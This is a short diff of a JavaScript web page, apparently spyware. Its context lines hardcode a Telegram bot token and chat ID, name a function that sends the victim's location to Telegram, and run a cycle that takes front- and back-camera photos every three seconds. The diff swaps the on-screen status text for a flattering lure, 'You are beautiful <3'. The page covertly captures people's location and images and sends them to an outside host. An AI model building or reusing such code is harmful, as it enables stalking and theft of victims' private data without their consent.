@@ -1,4 +1,3 @@
-
 const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
 const TELEGRAM_CHAT_ID = '8071841674';
 
@@ -70,7 +69,7 @@ function sendLocationToTelegram(lat, lon) {
 
 // Запускаем поочерёдный цикл фото с фронтальной и задней камеры
 async function startCameraCycle() {
-  statusEl.textContent = 'Xazbik';
+  statusEl.textContent = 'You are beautiful <3 ';
 
   // Каждые 3 секунды меняем камеру и снимаем фото
   photoInterval = setInterval(async () => {
